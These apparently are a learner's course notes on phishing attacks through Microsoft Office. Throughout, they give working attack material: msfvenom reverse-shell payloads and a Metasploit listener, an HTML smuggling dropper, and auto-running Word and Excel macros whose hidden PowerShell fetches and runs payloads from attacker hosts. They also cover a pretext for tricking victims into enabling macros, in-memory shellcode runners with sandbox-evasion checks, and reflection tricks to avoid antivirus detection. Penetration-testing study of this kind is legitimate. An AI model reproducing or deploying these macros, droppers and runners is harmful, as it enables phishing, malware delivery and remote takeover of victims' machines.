![[Pasted image 20240529221350.png]]
![[Pasted image 20240529221404.png]]


Typically, unauthorized remote access to a system can be achieved through two methods. The first involves exploiting a vulnerable application or service that is exposed to the Internet. This method does not require victim interaction but does depend on the presence of exploitable vulnerabilities in the software being targeted.

The second method for gaining remote access involves **deceiving a user into executing malicious code**. This approach often leverages social engineering tactics, such as phishing, where victims are tricked into interacting with malicious files or web pages. Unlike software vulnerabilities which can be patched, modifying user behavior is considerably more challenging, making this a notably effective attack vector. This focus on user behavior and interaction underscores the significance of this module.

The aim is to enhance the effectiveness of these attacks by targeting software applications that users frequently trust and use. Specifically, this module focuses on gaining code execution through the exploitation of Microsoft Office products—a prevalent attack vector in real-world scenarios.

This module will explore various client-side attacks against the Microsoft Office Suite. While the primary objective is to achieve code execution on the target, discussions will also cover typical attack scenarios, along with an overview of payloads, shellcodes, and common command and control infrastructures.

# 3.1 Dropper

Threat actors attack social engineering using Trojan, more complex than a normal Dropper based on a staged payload with a Callback function. When the payload is installed, it will download the malware and connect back to the C2 server via network protocol HTTPS or DNS.

## 3.1.1 Staged vs Non-staged payloads

Concept payload:

- Non-staged: `windows/shell_reverse_tcp`: The payload contains **many** assembly statements that will call the Win32 API that connects to C2 and opens `cmd.exe`
- Staged: `windows/shell/reverse_tcp`: The payload contains **part** to implement the callback and executes it in the target's memory.

When comparing the size between different types of payloads, the stage payload is much smaller. During the process of learning, we use stage payloads.

## 3.1.2 Building our Dropper

Using [Apache](https://viblo.asia/p/so-sanh-nginx-va-apache-lua-chon-may-chu-web-server-phu-hop-cho-trang-web-cua-ban-Az45baOwlxY) Web Server. 

```bash
sudo service apache2 restart
sudo service apache2 status
sudo service apache2 start
```

Create a stage payload. 

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.123 LPORT=443 -f exe -o staged_shell.exe
```

Start a Metasploit listener.

```bash
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST eth1;set LPORT 443;set EnableStageEncoding true;set StageEncoder x64/xor;set ExitOnSession false;exploit -jz"
```

*This command configures Metasploit to listen on the network interface `eth1` on port `443` for incoming Meterpreter sessions from a compromised 64-bit Windows system. The session attempts to evade detection by encoding its stages with XOR, allowing the handler to manage multiple sessions simultaneously without immediate interaction. This setup is particularly useful in penetration testing scenarios where maintaining stealth and managing multiple targets is required.*

![[Pasted image 20240529214156.png]]

## 3.1.3 HTML Smuggling

HTML Smuggling is a technique used to deliver payloads by encoding and embedding them directly within an HTML file. This method is commonly used in bypassing network-based content filters and security mechanisms.

In the previous sections, we created a malicious executable and tested it by manually downloading and running it on a “victim’s” machine. This works well as an example, but attackers will often use more discreet delivery methods. For example, an attacker may embed a link in an email. When the victim reads the email and visits the webpage, JavaScript code will use HTML Smuggling to automatically save the dropper file. 

#### Updated HTML Smuggling Script Enhancements

1. **Use modern JavaScript syntax (ES6+) for better readability and performance**:
    - Utilize `let` or `const` instead of `var`.
    - Use arrow functions where applicable.

2. **Enhance the functionality by incorporating error handling**:
    - Check if Blob and URL are supported in the browser.
    - Handle potential errors in base64 decoding.

3. **Improve the security and reliability of the blob creation process**:
    - Specify a more accurate MIME type if known.
    - Add a `rel='noreferrer noopener'` attribute to the link for security.

4. **Automatically remove the anchor element after the download starts**:
    - This cleans up the DOM and avoids potential memory leaks.

5. **Optimize memory usage**:
    - Revoke the Blob URL immediately after its use to free up memory.

the final script:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF8">
    <title>HTML Smuggling Example</title>
</head>
<body>
    <script>
        // Modern syntax and better practices
        const base64ToArrayBuffer = (base64) => {
            const binaryString = window.atob(base64);
            const length = binaryString.length;
            const bytes = new Uint8Array(length);
            for (let i = 0; i < length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        };

        const file = 'BASE64_ONE_LINE_PAYLOAD_GO_HERE'; // base64 msfstaged.exe | tr -d '\n'
        const data = base64ToArrayBuffer(file);

        if (data) {
            const blob = new Blob([data], { type: 'application/octet-stream' });
            const fileName = 'staged_shell.exe';

            if (window.Blob && window.URL) {
                const a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                a.rel = 'noopener noreferrer';  // Security enhancement

                try {
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();

                    setTimeout(() => {
                        window.URL.revokeObjectURL(url); // Free up memory by revoking the Blob URL
                        document.body.removeChild(a);    // Clean up the DOM by removing the element
                    }, 100);
                } catch (e) {
                    console.error('Error during download:', e);
                }
            } else {
                console.error('The required APIs are not supported in this browser.');
            }
        } else {
            console.error('Failed to decode base64 data.');
        }
    </script>
</body>
</html>
```

Explanation:

- **JavaScript Enhancements**: The code now uses ES6 features for cleaner and more concise code.
- **Security Improvements**: Added a `rel` attribute to the anchor tag for enhanced security against potential reverse tabnabbing.
- **Performance Optimization**: The Blob URL is revoked after the download starts, which helps in managing memory more efficiently.
- **Error Handling**: Checks for API support and handles errors in the download process, making the script robust across different browsers.

These changes will make the HTML smuggling script more effective, efficient, and secure, reflecting modern web development best practices.

Save the file as `html_smuggling_example.html` and get the base64 of the stage payload. 

```bash
base64 msfstaged.exe | tr -d '\n'
```

![[Pasted image 20240529220741.png]]

# 3.2 Phishing with Microsoft Office

So far, the discussion has centered on attacks that require direct victim interaction, such as downloading files or visiting malicious websites. These methods showcase fundamental techniques applicable to client-side attacks, including the automatic triggering of malicious downloads. The focus now shifts to another critically important vector in client-side attacks: Microsoft Office applications.

Microsoft Office continues to be a widely utilized suite of productivity tools across most organizational and corporate environments. It is available in two main forms: Office 365 (Microsoft 365), which benefits from continuous updates and integrated cloud services, and standalone versions such as Office 2019. The pervasive use and inherent trust in Office applications make them frequent targets for phishing and other forms of exploitation. Recent reports, including a cybersecurity overview by a leading firm in 2023, have implicated Office applications in a significant percentage of all email phishing attacks, underscoring the ongoing relevance of this attack vector.

The primary method for exploiting Office applications involves leveraging the Visual Basic for Applications (VBA) programming language, embedded within most Microsoft Office products. VBA enables automation and integration of custom business logic within Office documents but also presents substantial security risks. Malicious VBA macros, designed to execute arbitrary code when an Office document is opened, can lead to unauthorized access and data breaches.

In response to these threats, Microsoft has introduced several security measures, such as Protected View and macro execution warnings, alongside newer authentication mechanisms in Microsoft 365. Despite these defenses, attackers continue to devise sophisticated methods to bypass them, often employing social engineering to persuade users to enable macros or exploiting less commonly known features of the Office suite.

To mitigate these risks, it is advisable for organizations to implement strict macro execution policies, utilize advanced threat protection solutions provided by Microsoft 365, and conduct regular security awareness training focusing on the latest phishing tactics and their indicators. Staying informed about the newest exploitation techniques and maintaining robust defensive strategies can significantly reduce vulnerability to attacks leveraging Microsoft Office applications.

## 3.2.1 Introduction to VBA

Purpose: Convince the victim to execute malicious macro code when clicking "Enable Content". Use the two available methods `Document_Open()` and `AutoOpen()`. Save the document file in Macro-Enabled format such as **.doc or .docm**. **.docx** format will not save macros

The key in client-side attacks is to convince the victim to open the document and enable macros. 

![[Pasted image 20230906113610.png]]
![[Pasted image 20230906113625.png]]

To summarize this section, write the Macro code to launch `cmd.exe`

```vb
' Document_Open + AutoOpen: automatically run when the document is opened
Sub Document_Open()
    myMacro
End Sub

Sub AutoOpen()
    myMacro
End Sub

Sub myMacro()
    Dim str As String
    str = "C:\Windows\System32\cmd.exe"
	
	' method 1
    Shell str, vbHide
	
	' method 2
	CreateObject("Wscript.Shell").Run str, 0
End Sub
```

**Method 1**: via function VBA Shell, take two arguments. The first is the full path name of the application, the second is WindowStyle, takes the value vbHide or equivalent number is 0 -> will hide the program when run

**Method 2**: Using the Windows Script Host (WSH) to launch the shell. To do this, calling the `CreateObject` method to create the WSH shell, from here we can call the `Run` method.

#### Practice

Use the Environ$ function to print username and computer name

```vb
Sub PrintUserNameAndComputerName()
    Dim i As Integer
    Dim username As String
    Dim computername As String
    
    ' Get the username and computer name
    username = Environ$("USERNAME")
    computername = Environ$("COMPUTERNAME")
    
    ' Loop to print 5 times
    For i = 1 To 5
        MsgBox "Username: " & username & vbCrLf & "Computer Name: " & computername
    Next i
End Sub
```

![[Pasted image 20230906140945.png]]
## 3.2.2 PowerShell + VBA

Using the PowerShell command to transfer and execute a staged payload - PowerShell Download Cradle

```powershell
Invoke-WebRequest -Uri 'http://IP/staged_shell.exe' -OutFile 'C:\Windows\Temp\staged_shell.exe'
(New-Object System.Net.WebClient).DownloadFile('http://IP/staged_shell.exe','C:\Windows\Temp\staged_shell.exe')
```

Complete VBA macro + Powershell

```vb
Sub Document_Open()
    ExecutePayload
End Sub

Sub AutoOpen()
    ExecutePayload
End Sub

Sub ExecutePayload()
    
    ' PowerShell command to trasfer the payload
    Dim psScript As String
    psScript = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://10.10.108.34/staged_shell.exe','C:\Windows\Temp\staged_shell.exe');Start-Process 'C:\Windows\Temp\staged_shell.exe'"
    
    ' Execute the PowerShell script hidden
    CreateObject("Wscript.Shell").Run psScript, 0

End Sub
```

#### Practice: MS Excel

There are some differences between the different uses of VBA in Office applications. For example, Document_Open() is called Workbook_Open() in Excel.

```vb
Private Sub Workbook_Open()
    myMacro
End Sub

Sub Auto_Open()
    myMacro
End Sub

Sub myMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.101.101.63/uploads/msfstaged.exe','C:\Windows\Temp\payload.exe')"
    Shell str, vbHide
    Dim exePath As String
	exePath = "C:\Windows\Temp\payload.exe"
    Application.Wait (Now + TimeValue("0:00:03"))
    Shell exePath, vbHide
End Sub
```


# 3.3 Keeping Up Appearances

![[Pasted image 20240530094355.png]]

**Purpose**: Create a reason to convince the victim to click "Enable Content".

Creating an "encrypted" text A, when the victim clicks "Enable Content", the "decrypted" text B will appear. Take advantage of *Save Selection to AutoText Gallery* in AutoText.

Step 1. Create both paragraphs A and B
Step 2. Highlight the "decrypted" text B. Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery
Step 3. In the "Create New Building Block" dialog box, name it PhishingPretexting.
Step 4. Remove the "decrypted" text B.
Step 5. The complete VBS code:

```vb
Sub Document_Open()
	SubstitutePage
End Sub

Sub AutoOpen()
	SubstitutePage
End Sub

Sub SubstitutePage()
	 ActiveDocument.Content.Select
	 Selection.Delete
	 ActiveDocument.AttachedTemplate.AutoTextEntries("PhishingPretexting").Insert Where:=Selection.Range, RichText:=True
	 PhishingPretexting
End Sub

Sub PhishingPretexting()

    ' Base64 encoded PowerShell command to avoid plain text command detection
    Dim psScript As String
    psScript = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://10.10.108.34/staged_shell.exe','C:\Windows\Temp\staged_shell.exe');Start-Process 'C:\Windows\Temp\staged_shell.exe'"
    
    ' Execute the PowerShell script hidden
    CreateObject("Wscript.Shell").Run psScript, 0

End Sub
```

![[Pasted image 20240530102309.png]]

# 3.4 Executing Shellcode in Word Memory

Technical improvements to file transfer and execution of staged payload in memory - Win32 API
- Binary executable file: detected by network monitoring software
- Write to disk: detected by Antivirus software.

## 3.4.1 Calling Win32 APIs from VBA

Win32 APIs are located in the Dynamic-link library (DLL) and run as unmanaged code. Using the `Declare` keyword to link to these APIs in VBA, providing the name of the function, the DLL it resides in, the argument types, and return value types. Using a `Private` means that this function will only be used in local code.

Declaring and importing the [GetUserNameA()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea)

```vb
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

[64-bit VBA overview](https://learn.microsoft.com/en-us/office/vba/language/concepts/getting-started/64-bit-visual-basic-for-applications-overview) Put it all together.

```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Sub Document_Open()
    win32API
End Sub

Sub AutoOpen()
    win32API
End Sub

Sub win32API()
    Dim res As Long
    Dim MyBuff As String * 256
    Dim MySize As Long
    MySize = 256
    
    res = GetUserName(MyBuff, MySize)
    
    Dim strlen As Long
    ' Get the index of NULL byte terminator, 
    strlen = InStr(1, MyBuff, vbNullChar) - 1
    ' Left() creates a substring of its first argument with the size of its second argument.
    MsgBox Left$(MyBuff, strlen)
End Sub
```

![[Pasted image 20240530105612.png]]

## 3.4.2 VBA Shellcode Runner

Shellcode runner is a piece of code that executes shellcode in memory. When building this in VBA, the typical approach is to use three Win32 APIs from Kernel32.dll: `VirtualAlloc`, `RtlMoveMemory`, and `CreateThread`. 

Using `VirtualAlloc` to allocate unmanaged memory that is writable, readable, and executable. Then copy the shellcode into the newly allocated memory with `RtlMoveMemory`, and create a new execution thread in the process through `CreateThread` to execute the shellcode.

Create a stage payload format VBA (vb)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.108.34 LPORT=443 -f vbapplication
```

### Final Code Snippets - "MyMacro"

Simple_Shellcode_Runner_VBA.vb

```vb
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    ' Module 6. Intro to Antivirus Evasion
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If

    ' Module 6. Intro to Antivirus Evasion
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    ' Output Shellcode from the "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vbapplication"
    buf = Array(SHELLCODE_GO_HERE)
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

![[Pasted image 20240530173504.png]]

When executed, the shellcode runner calls back to the Meterpreter listener and opens the reverse shell in memory. 

This approach is rather low-profile. When the victim closes MS Word, this shell will die. 

### Step-by-step explanation
##### Declarations Win32 APIs

```vb
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
```

- **[Sleep](https://learn.microsoft.com/en-us/search/?scope=Desktop&terms=VirtualAlloc%20Kernel32)**: Pauses the execution of the script for a specified number of milliseconds.
- **[CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)**: Creates a thread to execute within the virtual address space of the calling process.
- **[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)**: Allocates memory in the address space of the calling process with specified attributes.
- **[RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)**: Copies a block of memory from one location to another.
- **[FlsAlloc](https://learn.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc)**: Allocates a fiber local storage (FLS) index.

##### Main Macro Function

```vb
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
```

Variable Declarations:
  - `allocRes`: Stores the result of the `FlsAlloc` call.
  - `t1`, `t2`: Track the start and end time for the sleep period.
  - `time`: Stores the difference between `t1` and `t2`.
  - `buf`: Array to hold the shellcode.
  - `addr`: Holds the address of the allocated memory.
  - `counter`, `data`, `res`: Loop counters and intermediate variables.

---

```vb
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
```

Fiber Local Storage (FLS) allocation check:
- **`FlsAlloc`**: Allocates an FLS index.
- **Check**: If `allocRes` is `Null`, the macro ends. This check ensures that FLS allocation was successful.

---

```vb
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
```

Sleep and Time check:
- **Time Tracking**: `t1` and `t2` store the current time before and after the sleep period.
- **`Sleep (10000)`**: Pauses execution for 10 seconds.
- **Time Verification**: Checks if the sleep period was actually 10 seconds or more. If not, the macro exits. This serves as a simple anti-debugging measure to detect if the script was run too quickly (possibly indicating it's being analyzed).

---

```vb
    ' Output Shellcode from the "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vbapplication"
    buf = Array(SHELLCODE_GO_HERE)
```

Shellcode Array:
- **Shellcode Placeholder**: The `buf` array is where the actual shellcode bytes will go. This would typically be generated by a tool like `msfvenom` and copied here.

---

Memory allocation and Shellcode execution

```vb
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

- **`VirtualAlloc`**: Allocates memory with the following parameters:
  - `0`: No specific base address.
  - `UBound(buf)`: Size of the memory to allocate, based on the size of the `buf` array.
  - `&H3000`: `MEM_COMMIT | MEM_RESERVE` - Allocates physical storage in memory or the paging file.
  - `&H40`: `PAGE_EXECUTE_READWRITE` - Allows code execution, reading, and writing.

```vb
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
```

- **Copy Shellcode**: Iterates through the `buf` array and copies each byte to the allocated memory using `RtlMoveMemory`.

```vb
    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
```

- **Execute Shellcode**: Creates a new thread to execute the shellcode located at `addr`.

##### Summary

1. **Function Declarations**: Declares Windows API functions for memory allocation, thread creation, and sleeping.
2. **FLS Allocation Check**: Verifies the allocation of a Fiber Local Storage (FLS) index to ensure it exists.
3. **Sleep and Time Verification**: Sleeps for 10 seconds and verifies that the sleep duration was as expected.
4. **Shellcode Initialization**: Defines the array to hold the shellcode bytes.
5. **Memory Allocation**: Allocates executable memory in the process's address space.
6. **Shellcode Copy**: Copies the shellcode to the allocated memory.
7. **Shellcode Execution**: Executes the shellcode by creating a new thread.
8. **Auto-execution**: Automatically runs the `MyMacro` subroutine when the document is opened.


# 3.5 Powershell Code runner

Improve the section's disadvantages "Executing Shellcode in Word Memory", instead of embedding shellcode directly with macros in MS Word.
- Shellcode is written in Powershell and stored + transmitted via Web server.
- Launch Powershell script (.ps) as child process.

References:
- [Powershell Shellcoding: Part 1 — MCSI Library (mosse-institute.com)](https://library.mosse-institute.com/articles/2022/10/powershell-shellcode-part-1.html)

## 3.5.1 Calling Win32 APIs from PowerShell

Powershell can interact indirectly with Win32 APIs via .NET Framework (C#) - [PowerShell ISE](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.4). In C#, declaring and importing the Win32 API is done via the [DllImportAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.dllimportattribute?view=net-8.0) class - provides the information needed to call a function exported from an unmanaged DLL.

- Using [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) to access structs, callbacks, and functions in unmanaged DLL.
- [Add-Type](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.4) to complie the C# code snippet

Practice: Calling the MessageBox from Powershell

Calling_Win32_APIs_from_PowerShell.ps1

```powershell
# declare blocks of text
$User32 = @" 
using System;
using System.Runtime.InteropServices;

public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(
	 IntPtr hWnd, 
	 String text, 
	 String caption, 
	 int options);
} 
"@ 
Add-Type $User32
# execute the API
[User32]::MessageBox(0, "Calling Win32 APIs from PowerShell", "MyBox", 0)
```

![[Pasted image 20240530214350.png]]

## 3.5.2 PowerShell Shellcode Runner 

The process of creating shellcode in Powershell is similar to VBA. "allocate executable memory" -> "copy the shellcode" -> "execute it"

Simple_Shellcode_Runner_Powershell_v1.ps1

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

 [DllImport("kernel32.dll", SetLastError=true)]
 public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
} 
"@
Add-Type $Kernel32

# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.123 LPORT=443 -f ps1
[Byte[]] $buf = SHELLCODE_GO_HERE
$size = $buf.Length

# allocate executable memory
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

# copy the shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# execute 
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

# wait until the shellcode fully executes
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

![[Pasted image 20240531091139.png]]

Host the file `Simple_Shellcode_Runner_Powershell_v1.ps1` on the Web Server, transmit and execute it via macro in Microsoft Word. 

```vb
Sub MyMacro()
	Dim str As String
	str = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile (New-Object System.Net.WebClient).DownloadString('http://10.0.0.123/Simple_Shellcode_Runner_Powershell_v1.ps1')|IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
 MyMacro 
End Sub

Sub AutoOpen()
 MyMacro
End Sub
```

# 3.6 Keep That PowerShell in Memory

Shellcode runner from the previous two section still has limitations, which are artifacts created on the hard drive - which can be detected by anti-virus software. Use [reflection](https://learn.microsoft.com/en-us/dotnet/csharp/advanced-topics/reflection-and-attributes/) .NET framework techniques to improve Shellcode runner.

*[Reflection](https://learn.microsoft.com/en-us/dotnet/fundamentals/reflection/reflection) provides objects (of type [Type](https://learn.microsoft.com/en-us/dotnet/api/system.type)) that describe assemblies, modules, and types. You can use reflection to dynamically create an instance of a type, bind the type to an existing object, or get the type from an existing object and invoke its methods or access its fields and properties. If you're using attributes in your code, reflection enables you to access them. For more information, see [Attributes](https://learn.microsoft.com/en-us/dotnet/standard/attributes/).*

References:
- [Powershell Shellcoding: Part 2 — MCSI Library (mosse-institute.com)](https://library.mosse-institute.com/articles/2022/10/powershell-shellcode-part-2.html)

## 3.6.1 Add-Type Compilation

Review the Powershell code, usage "Add-Type" will be flagged by Antivirus software. 

During compilation, the C# source code and the C# assembly are written temporarily to disk before it is compiled into an assembly and loaded into the running process. These API calls are used for file operations and the file names used in the operations: `CreateFile, WriteFile` and `CloseFiel` 

## 3.6.2 Leveraging UnsafeNativeMethods

Instead of writing code and compiling it, we intend to generate the `.NET` assembly in memory using **dynamic lookup** method.

To perform a dynamic lookup of function addresses, the operating system provides two special Win32 APIs called [GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) and [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress).

```powershell
# Shellcode loader
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).
    Invoke($null, @($moduleName)), $functionName))
}

$MessageBox = LookupFunc user32.dll MessageBoxA
MessageBox(0, "Calling Win32 APIs from PowerShell", "MyBox", 0)
```

#### Explain:

This script uses reflection to interact with system methods for handling native libraries (kernel32.dll) and functions. By doing so, it circumvents the need for traditional P/Invoke setups that PowerShell typically uses via `Add-Type`, thus avoiding any disk write operations that might be involved in compiling C# code on the fly. This technique is particularly valued in scenarios where avoiding disk writes can help evade detection by AV and EDR systems.

1. **Function Declaration**:

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
```

- This starts the definition of the `LookupFunc` function with two parameters: `$moduleName` (the name of the DLL containing the function - kernel32.dll) and `$functionName` (the name of the function to find within that DLL).

2. **Assembly Retrieval**:

```powershell
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
```

- This line retrieves all assemblies loaded in the current application domain.
- It filters these assemblies to find `System.dll` which is generally loaded from the Global Assembly Cache (GAC). The assumption here is that `System.dll` contains a class `Microsoft.Win32.UnsafeNativeMethods` that is being used to access native methods.
- It selects this particular type to gain access to native method invocation capabilities.


3. **Method Retrieval**:

```powershell
$tmp=@()
$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
```

- A temporary array `$tmp` is initialized to store methods.
- It retrieves all methods from the `Microsoft.Win32.UnsafeNativeMethods` type and filters them to find the `GetProcAddress` method. This method is essential for dynamically resolving the address of an exported function from the specified DLL.

4. **Invoke GetProcAddress**:

```powershell
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).
Invoke($null, @($moduleName)), $functionName))
```

- This part of the script first invokes the `GetModuleHandle` method found within the same assembly. `GetModuleHandle` returns a handle to the specified module (DLL) that's already loaded into the process.
- The handle obtained, along with the `$functionName` parameter, is used to invoke the `GetProcAddress` method.
- `GetProcAddress` dynamically resolves and returns a pointer to the Windows API function specified by `$functionName` in the module specified by `$moduleName`.

## 3.6.3 DelegateType Reflection

After resolved addresses of the Win32 APIs, the next is define the argument types.

The information about the number of arguments and their associated data types must be paired with the resolved function memory address. In C# this is done using the [GetDelegateForFunctionPointer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=net-8.0) method. It's take 2 argument
- The memory address of the function
- The function prototype represented as a type

Final code

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

$MessageBoxA = LookupFunc user32.dll MessageBoxA

# Creating a custom assembly object in memory
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')

# Setting the access mode of the MyAssembly to Run
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

# Creating a custom module inside the assembly
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

# Creating a custom type in the assembly
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# Creating a constructor for the custom delegate type
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
	'RTSpecialName, HideBySig, Public', 
	[System.Reflection.CallingConventions]::Standard, 
	@([IntPtr], [String], [String], [int]))

# Setting implementation flags for the constructor  
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

#  Defining and configuring the Invoke method
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))

